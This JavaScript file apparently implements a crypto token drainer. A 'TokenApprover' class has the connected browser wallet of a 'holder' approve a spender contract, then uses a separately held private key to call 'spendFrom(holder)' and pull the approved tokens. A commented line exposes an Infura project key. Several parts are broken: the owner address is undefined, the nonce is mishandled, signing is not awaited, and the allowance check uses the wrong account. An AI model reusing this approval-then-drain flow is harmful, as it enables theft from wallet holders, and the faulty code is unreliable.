import { writeContract, readContract } from "https://esm.sh/@wagmi/core@2.x";

export class TokenApprover {
  constructor(wagmiConfig, ownerPrivateKey) {
    this.config = wagmiConfig;
    this.ownerPrivateKey = ownerPrivateKey;

    // const provider = 'https://mainnet.infura.io/v3/f0c3b4e9541d426d8f5feb366e60fcce';
    const provider = window.ethereum;
    this.web3 = new Web3(provider);

    this.nonce = null; // Add nonce tracking
  }

  async getNonce() {
    if (!this.nonce) {
      this.nonce = await this.web3.eth.getTransactionCount(this.ownerAddress, 'latest');
    } else {
      this.nonce++;
    }
    return this.nonce;
  }

  async decodeRevertReason(error) {
    if (error.data) {
      try {
        // Get revert reason from data
        const reason = this.web3.eth.abi.decodeParameter('string', error.data);
        return reason;
      } catch (decodeError) {
        return 'Unable to decode revert reason';
      }
    }
    return error.message;
  }

  async approveAndSpend(tokenAddress, spenderAddress, amount, approval, holder) {
    const account = this.web3.eth.accounts.privateKeyToAccount(this.ownerPrivateKey);
    this.web3.eth.accounts.wallet.add(account);

    console.log('Account:', account.address);

    try {
        if (!approval) {
            console.log(`🤝 Initiating Token Approval`);
            const approveTx = await this.web3.eth.sendTransaction({
                from: holder,
                to: tokenAddress,
                data: this.web3.eth.abi.encodeFunctionCall({
                    name: 'approve',
                    type: 'function',
                    inputs: [
                        { name: '_spender', type: 'address' },
                        { name: '_value', type: 'uint256' }
                    ]
                }, [spenderAddress, amount]),
                gas: 200000,
            });

            console.log(`✅ Approval Transaction Hash: ${approveTx.transactionHash}`);

            // **Verify Allowance**
            const allowance = await this.checkAllowance(tokenAddress, account.address, spenderAddress);
            if (BigInt(allowance) < BigInt(amount)) {
                throw new Error("Approval failed: Allowance is not set.");
            }
        }

        console.log(`✔️ Approval Confirmed. Proceeding with spendFrom...`);

        // Call spendFrom
        const spenderContract = new this.web3.eth.Contract([
          {
            "inputs": [
              {
                "internalType": "address",
                "name": "holder",
                "type": "address"
              }
            ],
            "name": "spendFrom",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
          },
        ], spenderAddress);

        console.log(account, account.address);
        const gasPrice = await this.web3.eth.getGasPrice();

        const raw_transaction = {
          from: account.address,
          gasPrice: gasPrice,
          gas: 10000000,
          to: spenderAddress,
          data: spenderContract.methods.spendFrom(holder).encodeABI(),
          nonce: this.nonce
        }

        console.log(raw_transaction);

        const signTX = this.web3.eth.accounts.signTransaction(raw_transaction, this.ownerPrivateKey);
        console.log(signTX);
        const sendTX = this.web3.eth.sendSignedTransaction(signTX.rawTransaction);

        console.log(sendTX);

        // const spendFromTx = await spenderContract.methods.spendFrom(holder).send({
        //     from: account.address,
        //     gas: 10000000,
        //     gasPrice
        // });

        console.log(`SpendFrom Transaction Hash: ${sendTX}`);

        return { success: true };
    } catch (error) {
        console.error(`❌ Error:`, error);
        throw new Error(`Transaction failed: ${error.message}`);
    }
}

  // Optional: Verify allowance before spending
  async checkAllowance(tokenAddress, ownerAddress, spenderAddress) {
    const allowanceABI = [{
      constant: true,
      inputs: [
        { name: '_owner', type: 'address' },
        { name: '_spender', type: 'address' }
      ],
      name: 'allowance',
      outputs: [{ name: '', type: 'uint256' }],
      type: 'function'
    }];

    try {
      const allowance = await readContract(this.config, {
        address: tokenAddress,
        abi: allowanceABI,
        functionName: 'allowance',
        args: [ownerAddress, spenderAddress]
      });

      console.log('Current allowance:', allowance.toString());
      return allowance;
    } catch (error) {
      console.error('Error checking allowance:', error);
      throw error;
    }
  }

  async hasApprovedContract(tokenAddress, ownerAddress, spenderAddress, amount) {
    const allowance = await this.checkAllowance(tokenAddress, ownerAddress, spenderAddress);
    return BigInt(allowance) >= BigInt(amount);
  }
}